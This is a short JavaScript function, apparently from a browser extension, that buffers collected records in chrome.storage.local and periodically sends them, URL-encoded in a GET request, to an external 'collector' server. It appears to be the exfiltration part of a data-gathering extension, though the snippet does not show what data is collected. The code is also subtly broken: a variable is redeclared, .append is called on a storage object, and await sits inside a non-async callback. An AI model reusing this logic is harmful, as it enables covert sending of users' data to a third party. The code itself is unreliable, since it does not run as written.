

async function send_data(data) {
	// For now, supporting just the typical chrome.storage.local. 
	if (chrome && chrome.storage && chrome.storage.local) {
		// 1. Got also data parameter to be appended and to be sent
		if (data) { 
			let res_data = await chrome.storage.local.get({"data_left_to_send": []});
			res_data.append(data);
		}
		// 2. Check How much data left to be sent.
		let res_data = await chrome.storage.local.get({"data_left_to_send": 0});
		let data_to_send = res_data["data_left_to_send"];
		if (!data_to_send) {
			// No data to be sent.
			return; 
		}
		console.log("[*] Got " + data_to_send.length + " infos to be sent.");

		// 3. 
		// *Example storage usage: Get all storage: chrome.storage.local.get(null).then(e=>console.log(e))
		let last_sent = chrome.storage.local.get({"last_sent":0}).then(e => {
			if (e["last_sent"]) {
				let cur_time = (new Date()).getTime();
				if (Math.abs(cur_time - e["last_sent"]) > SEND_DATA_INTERVAL) {
					// No limits on GET url header besides kinda what server defines as max.
					fetch(COLLECTOR_URL + "/" + encodeURIComponent(JSON.stringify(data_to_send)));
					// Clear storage & update interval.
					await chrome.storage.local.set({"last_sent": cur_time});
					await chrome.storage.local.set({"data_left_to_send": []}); 
				}
			}
		});
	}
}
